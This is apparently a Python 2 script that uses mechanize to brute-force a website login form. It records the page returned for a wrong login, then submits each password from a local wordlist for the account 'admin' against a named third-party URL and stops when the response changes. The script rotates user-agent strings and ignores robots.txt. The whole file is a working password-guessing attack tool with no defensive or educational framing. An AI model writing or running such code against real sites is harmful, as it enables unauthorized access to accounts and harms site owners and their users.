# -*- coding: utf-8 -*-

def test_wrong(url, testacc="á/ü", testpass="1á"):
    from bs4 import BeautifulSoup
    import urllib2
    import mechanize
    import random
    
    USER_AGENTS = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0',
                   'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100 101 Firefox/22.0',
                   'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5',
                   'Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5')
    
    
    br = mechanize.Browser()
    # Browser options
    br.set_handle_equiv(True)
    # br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    # Follows refresh 0 but not hangs on refresh > 0
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    
    
    br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
    
    response = br.open(url)
    
    for form in br.forms():
        print "Form name:", form.name
        print form
    
    br.select_form(nr=0)
    
    br.form['account'] = testacc
    br.form['password'] = testpass
    
    res = br.submit()
    
    return res.read()  # url to which the page has redirected after login


def brute_force(url, acc, pwd, wrong_page):
    from bs4 import BeautifulSoup
    import urllib2
    import mechanize
    import random
    
    USER_AGENTS = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0',
                   'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100 101 Firefox/22.0',
                   'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5',
                   'Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5')
    
    
    br = mechanize.Browser()
    # Browser options
    br.set_handle_equiv(True)
    # br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    # Follows refresh 0 but not hangs on refresh > 0
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    
    
    br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
    
    response = br.open(url)
    
    br.select_form(nr=0)
    
    br.form['account'] = acc
    br.form['password'] = pwd
    
    res = br.submit()
    
    if res.read() == wrong_page:
        return False
    else:
        return pwd

    
    # ##
if __name__ == '__main__':
    f = open("text-files/passwords.txt").read().split("\n")
    wrong_page = test_wrong("http://evsum.com/bcmunka")
    for pwd in f:
        if brute_force("http://evsum.com/bcmunka", "admin", pwd, wrong_page) == False:
            print "Wrong: " + pwd
        else:
            print "Found the password: " + pwd
            break


